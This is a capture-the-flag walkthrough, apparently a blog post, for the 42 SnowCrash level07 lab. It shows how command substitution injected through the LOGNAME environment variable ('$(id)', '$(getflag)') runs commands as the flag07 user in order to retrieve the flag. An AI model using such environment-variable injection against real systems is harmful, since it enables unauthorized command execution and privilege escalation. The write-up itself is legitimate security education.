---
title: 42 SnowCrash Level07 - Walkthrough 👾
tags:
  - ctf
  - snowcrash
  - 42project
  - command-injection
categories:
  - ctfs
  - 42project
date: 2024-05-18 15:19:49
---

![snowcrash](/images/snowcrash.png)

## Introduction

In level 07, we exploit a binary file (`level07`) that prints the `LOGNAME` environment variable. By injecting commands into the `LOGNAME` variable, we execute arbitrary commands to obtain the flag.

### Steps:

1. **Exploring the Binary:**
   We execute the binary file `level07` to understand its behavior:

   ```sh
   level07@SnowCrash:~$ ./level07 
   level07
   ```
    The program simply prints the LOGNAME variable.

2. **Identifying Command Injection**:
    We discover that the program evaluates the LOGNAME variable, allowing for command injection. We export the LOGNAME variable with a command to execute:
    ```sh
    level07@SnowCrash:~$ LOGNAME="\$(id)"; ./level07 
    uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
    ```
    The command id is executed, revealing the user's identity.

3. **Exploiting Command Injection**:
    We exploit the command injection to execute the getflag command:
    ```sh
    level07@SnowCrash:~$ LOGNAME="\$(getflag)"; ./level07 
    Check flag. Here is your token : ***************************************
    ```
    The `getflag` command is executed, and we obtain the flag.

## Conclusion

By exploiting the command injection vulnerability in the level07 binary, we successfully executed arbitrary commands and obtained the flag for level 07.
